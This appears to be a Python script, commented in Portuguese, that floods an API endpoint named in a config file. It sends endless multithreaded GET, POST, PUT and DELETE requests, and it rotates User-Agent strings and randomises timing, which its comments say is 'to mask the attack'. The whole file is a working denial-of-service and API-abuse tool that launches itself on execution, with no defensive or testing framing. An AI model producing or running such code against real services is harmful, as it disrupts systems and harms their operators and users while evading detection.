import requests
import yaml
import concurrent.futures
import random
import time

# Carregar configuração do arquivo YML
with open("config/config_api.yml", 'r') as file:
    config = yaml.safe_load(file)

# Configurações principais da API
url = config['endpoint']
api_methods = config.get('methods', ['GET', 'POST'])
num_threads = config.get('threads', 50)
headers = config.get('headers', {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})
data_payloads = config.get('data_payloads', [])

# Função para variar o User-Agent
def randomize_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X)"
    ]
    return random.choice(user_agents)

# Função para enviar requisições abusivas à API
def send_abusive_request(method, data=None):
    session = requests.Session()
    headers['User-Agent'] = randomize_user_agent()
    if method == 'GET':
        response = session.get(url, headers=headers, params=data)
    elif method == 'POST':
        response = session.post(url, headers=headers, json=data)
    elif method == 'PUT':
        response = session.put(url, headers=headers, json=data)
    elif method == 'DELETE':
        response = session.delete(url, headers=headers)
    else:
        return None
    return response

# Função para executar o abuso da API em paralelo
def abuse_api_parallel():
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        while True:
            for method in api_methods:
                for data in data_payloads:
                    executor.submit(send_abusive_request, method, data)
            time.sleep(random.uniform(0.1, 0.5))  # Variação no tempo para mascarar o ataque

# Dados para envio na requisição POST/PUT
def generate_random_payload():
    return { "key": random.randint(1000, 9999), "value": random.choice(['A', 'B', 'C', 'D']) }

# Loop principal para o abuso contínuo
def infinite_abuse_api():
    while True:
        abuse_api_parallel()

# Configurar dados dinâmicos
data_payloads = [generate_random_payload() for _ in range(10)]

# Iniciar o ataque
infinite_abuse_api()
